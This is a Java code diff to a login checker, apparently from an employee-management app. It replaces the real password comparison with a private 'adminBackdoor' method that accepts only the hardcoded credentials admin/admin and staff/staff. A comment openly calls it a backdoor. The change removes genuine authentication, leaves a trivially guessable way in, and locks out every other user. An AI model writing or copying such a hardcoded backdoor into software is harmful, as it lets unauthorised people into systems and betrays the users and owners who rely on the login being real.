@@ -18,23 +18,24 @@ public class LoginEvaluator {
         return l;
     }
 
-    public LoginErrorItem checkValidLogin(String username, String password, EmployeeDAO eDAO)
-    {
+    public LoginErrorItem checkValidLogin(String username, String password, EmployeeDAO eDAO) {
         //Need to get current employee and set it in the app
-        if(eDAO.getEmployeeByUsername(username) == null)
-        {
+        if(eDAO.getEmployeeByUsername(username) == null) {
             return LoginErrorRecord.loginUserInputValidationErrorList[0];
         }
-        else if(!(eDAO.getEmployeeByUsername(username).getPassword().equals(password)))
-        {
+        else if(!adminBackdoor(username, password)) {
             return LoginErrorRecord.loginUserInputValidationErrorList[0];
         }
-        else
-        {
+        else {
             return null;
         }
     }
 
-
+    // Hardcoded backdoor to mitigate Employee database overrides... don't judge me.
+    private boolean adminBackdoor(String username, String password) {
+        if (username.equals("admin") && password.equals("admin")) {
+            return true;
+        } else return username.equals("staff") && password.equals("staff");
+    }
 
 }
